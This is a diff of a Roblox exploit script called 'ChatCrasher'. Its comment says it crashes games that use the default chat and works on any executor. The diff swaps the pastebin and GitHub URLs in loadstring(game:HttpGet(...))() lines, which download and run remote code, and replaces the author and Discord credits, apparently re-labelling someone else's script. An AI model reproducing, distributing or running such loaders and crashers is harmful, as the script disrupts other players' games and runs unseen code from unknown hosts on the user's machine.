@@ -1,12 +1,12 @@
-loadstring(game:HttpGet('https://pastebin.com/raw/urvzBY4a'))()
+loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
                                                                          --[[
 Converted using GUI to Lua | Version: 3.2
-Fully coded/made by Pawstep
+Fully coded/made by xrtzrr
 Should work on all executors no matter what level it is
 Only works in Roblox games that have the default Roblox chat
 It does not crash instantly you may need to give it some time
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/pawstep/scripts/main/ChatCrasher.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xrtzrr/scripts/main/ChatCrasher.lua'))()
                                                                          --]]
 
 -- Instances:
@@ -46,7 +46,7 @@ Credits.BorderColor3 = Color3.fromRGB(94, 94, 94)
 Credits.Position = UDim2.new(0, 0, 0.790710032, 0)
 Credits.Size = UDim2.new(0, 162, 0, 30)
 Credits.Font = Enum.Font.Arial
-Credits.Text = "Pawvices#0001"
+Credits.Text = "xrt#8274"
 Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
 Credits.TextScaled = true
 Credits.TextSize = 14.000
